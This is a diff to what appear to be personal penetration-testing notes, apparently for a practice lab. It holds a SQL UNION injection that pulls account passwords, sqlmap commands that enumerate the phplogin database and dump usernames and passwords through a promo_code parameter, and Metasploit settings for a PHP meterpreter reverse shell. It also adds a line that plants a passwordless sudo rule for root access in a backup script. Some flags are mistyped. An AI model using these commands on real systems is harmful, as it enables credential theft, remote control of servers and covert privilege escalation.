@@ -20,6 +20,19 @@
 ' UNION SELECT id, username, password, email, NULL, NULL FROM phplogin.accounts -- 
 
 
+-- SQL MAP discover DATABASE
+sqlmap -r sql.txt -p promo_code -dbs
+
+-- SQLMAP get table name
+sqlmap -r sql.txt -p promo-code -D phplogin -tables
+
+-- SQLMAP get Columms name
+sqlmap -r sql.txt -p promo_code -D phplogin -T accounts --columns --technique=T -time-sec=5    
+
+--SQLMAP dump infomation
+sqlmap -r sql.txt -p promo_code -D phplogin -T accounts -C username,password --technique=T -time-sec=5
+
+
 -----------------------------------------------------------SQL CREATE STATEMENT------------------------------------------------------------------------------------
 
 -- USE DATABASE CALLED "promos"
@@ -67,5 +80,9 @@ set payload php/meterpreter_reverse_tcp
 set LHOST 127.0.0.1
 set LPORT 4444
 run
+
+
+-- Add Sudo code to backup script
+echo "echo \"$USERNAME ALL=(ALL) NOPASSWD:ALL\" > /etc/sudoers.d/\$USERNAME" >> backup.sh
 
 
